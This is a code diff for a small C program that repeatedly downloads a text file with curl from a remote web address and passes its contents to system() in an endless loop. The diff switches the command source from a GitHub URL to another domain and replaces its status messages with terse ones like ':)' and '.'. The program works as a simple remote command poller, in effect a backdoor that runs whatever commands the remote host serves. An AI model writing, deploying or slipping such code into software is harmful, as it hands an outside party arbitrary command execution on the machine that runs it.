@@ -5,7 +5,7 @@
 #include <stdlib.h>
 #include <string.h>
 #define TIME 595000000 // VERY hardware dependent
-#define COMMAND_LOC "https://raw.githubusercontent.com/mmwebster/misc/master/command"
+#define COMMAND_LOC "http://www.requorse.com/src/commands/command_"
 
 char * getCommand (char * curlCommand);
 
@@ -15,17 +15,18 @@ int main (int argc, char **argv)
   char curlCommand[256];
   char * newCommand = NULL;
 
-  system("echo starting up..");
+  system("echo ':)'");
 
   // get current listed commands and store in command file
-  sprintf(curlCommand, "curl %s%d.txt > command_read.txt", COMMAND_LOC, (int)argv[1]);
+  sprintf(curlCommand, "curl %s%d.txt > command_read.txt", COMMAND_LOC, (int)argv[2]);
 
   long unsigned int i;
 
   while (1) {
-    system("echo polling");
+    system("echo .");
     newCommand = getCommand(curlCommand);
     if (newCommand != NULL) {
+      system("echo x");
       system(newCommand);
     }
     for (i = 0; i < TIME; i++) {}
